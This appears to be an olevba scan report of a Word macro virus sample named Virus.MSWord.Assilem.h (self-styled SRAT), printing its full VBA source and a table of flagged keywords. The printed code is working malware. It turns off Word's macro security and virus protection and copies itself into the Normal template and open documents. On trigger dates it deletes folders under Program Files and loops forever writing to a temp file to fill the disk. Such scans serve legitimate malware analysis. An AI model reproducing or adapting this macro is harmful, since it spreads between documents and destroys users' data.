olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Assilem.h-ec8a99f40001455e503a23cc19f158490a30da74
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO SRAT.cls 
in file: Virus.MSWord.Assilem.h-ec8a99f40001455e503a23cc19f158490a30da74 - OLE stream: 'Macros/VBA/SRAT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    Options.ConfirmConversions = (19 - 19)
    Options.VirusProtection = (19 - 19)
    Options.SaveNormalPrompt = (19 - 19)
End If
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "SRAT") <> "by Kwyjiboymi" Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "SRAT") = "by Kwyjiboymi"
End If
Dim ADVBPVBCI1, ADCMCLs%, DoAD As Boolean, myBgnL%
Dim NTVBPVBCI1, NTCMCLs%, DoNT As Boolean, ToInfect, SRATFill As Boolean
Set ADVBPVBCI1 = ActiveDocument.VBProject.VBComponents.Item(1)
ADCMCLs = ADVBPVBCI1.CodeModule.CountOfLines
If ADVBPVBCI1.Name <> "SRAT" Then
    If ADCMCLs > 0 Then ADVBPVBCI1.CodeModule.DeleteLines 1, ADCMCLs
    Set ToInfect = ADVBPVBCI1
    ADVBPVBCI1.Name = "SRAT"
    DoAD = True
End If
Set NTVBPVBCI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCMCLs = NTVBPVBCI1.CodeModule.CountOfLines
If NTVBPVBCI1.Name <> "SRAT" Then
    If NTCMCLs > 0 Then NTVBPVBCI1.CodeModule.DeleteLines 1, NTCMCLs
    Set ToInfect = NTVBPVBCI1
    NTVBPVBCI1.Name = "SRAT"
    DoNT = True
End If
myBgnL = 2
If DoNT = True Then
    Do While ADVBPVBCI1.CodeModule.Lines(1, 1) = ""
        ADVBPVBCI1.CodeModule.DeleteLines 1
    Loop
    ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
    Do While ADVBPVBCI1.CodeModule.Lines(myBgnL, 1) <> ""
        ToInfect.CodeModule.InsertLines myBgnL, ADVBPVBCI1.CodeModule.Lines(myBgnL, 1)
        myBgnL = myBgnL + 1
    Loop
End If
If DoAD = True Then
    Do While NTVBPVBCI1.CodeModule.Lines(1, 1) = ""
        NTVBPVBCI1.CodeModule.DeleteLines 1
    Loop
    ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
    Do While NTVBPVBCI1.CodeModule.Lines(myBgnL, 1) <> ""
        ToInfect.CodeModule.InsertLines myBgnL, NTVBPVBCI1.CodeModule.Lines(myBgnL, 1)
        myBgnL = myBgnL + 1
    Loop
End If
If NTCMCLs <> 0 And ADCMCLs = 0 And (InStr(1, ActiveDocument.Name, "Document") = 0) Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") > 0) Then
    ActiveDocument.Saved = True
End If
If Day(Now) = 19 Then
    SRATFill = True
    GoTo SRATAct1
End If
If Day(Now) = Second(Now) Then GoTo SRATAct1
Exit Sub
SRATAct1:
    Dim f%, k%, myp, tmp, mys$
    Randomize
    mys = " (¥) "
    Selection.TypeText " is it safe? (y/n)" & vbCrLf
    myp = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProgramFilesPath") & "\"
    k = Rnd * 19 + 1
    tmp = Dir(myp, vbDirectory)
    Do While f < k And tmp <> ""
        If tmp <> "." And tmp <> ".." Then
            tmp = myp & tmp
            RmDir tmp
            Selection.TypeText mys
        End If
        f = f + 1
        tmp = Dir
    Loop
    k = k - 2
    Selection.TypeText "your lucky number is " & k & " ! "
    If k > 0 Then Selection.TypeText "by the way, each" & mys & "represents a dead directory! guess what " & k & " means! anyway, tell me about yourself.." & mys & "(SRAT)"
    If SRATFill = True Then GoTo SRATAct2
    Exit Sub
SRATAct2:
    tmp = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot") & "\temp\srat.19"
    Open tmp For Output As #1
    If Err Then Open "c:\temp\srat.19" For Output As #1
    Do
       Print #1, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys, mys
    Loop
    Close #1
Exit Sub
'WORD/SRAT written by Kwyjiboymi
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

